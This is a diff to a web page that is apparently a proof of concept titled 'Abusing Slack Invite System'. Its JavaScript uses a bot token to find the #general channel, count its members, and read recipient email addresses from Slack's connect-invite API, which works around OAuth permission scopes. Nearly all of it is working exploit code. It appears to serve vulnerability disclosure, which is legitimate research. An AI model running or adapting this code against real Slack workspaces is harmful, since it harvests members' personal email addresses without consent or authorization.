@@ -10,10 +10,8 @@
 
     <!-- Latest compiled and minified JavaScript -->
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
-    
 </head>
 <body onload="getObject();">
-    
     <div class="container pt-3">
         <h1>Abusing Slack Invite System PoC</h1>
         <p>The app uses bot permissions and can fetch email addresses of workspace members without proper oauth permissions</p>
@@ -40,7 +38,7 @@
             var count = localStorage.getItem("memberscount");
             fetch("https://slack.com/api/conversations.listConnectInvites?&token="+token).then(
                     response => response.json()).then((json) => {
-                    for(var i=json["invites"].length - 1; i >= 0; i--)
+                    for(var i=json["invites"].length - 1; i > (json["invites"].length - count); i--)
                         document.getElementsByClassName("preview")[0].innerHTML += json["invites"][i]["invite"]["recipient_email"]+"<br />";
                 })
         }
@@ -70,7 +68,7 @@
         
         function startPoC() {
             var token = localStorage.getItem("token");
-            fetch("https://slack.com/api/conversations.members?&channel=CUQNLNEN4&token="+token).then(
+            fetch("https://slack.com/api/conversations.members?&channel="+localStorage.getItem("channelid")+"&token="+token).then(
                 response => response.json()).then((json) => {
                     localStorage.setItem("memberscount", json["members"].length)
                     document.getElementsByClassName("preview")[0].innerHTML = "[+] Fetching member ids from #general<br />";
@@ -85,9 +83,23 @@
                 ).then((json) => {
                     console.log(json);
                     localStorage.setItem("token", json["access_token"])
+                    getChannelID();
                 });
             
-        }}
+            }
+        }
+
+        function getChannelID(){
+            var token = localStorage.getItem("token");
+            fetch("https://slack.com/api/conversations.list?token="+token).then(
+                response => response.json()).then((json) => {
+                    for(var i=0; i < json["channels"].length; i++){
+                        if(json["channels"][i]["name"] == "general"){
+                            localStorage.setItem("channelid", json["channels"][i]["id"]);
+                        }
+                    }
+                })
+        }
         
         
         </script>
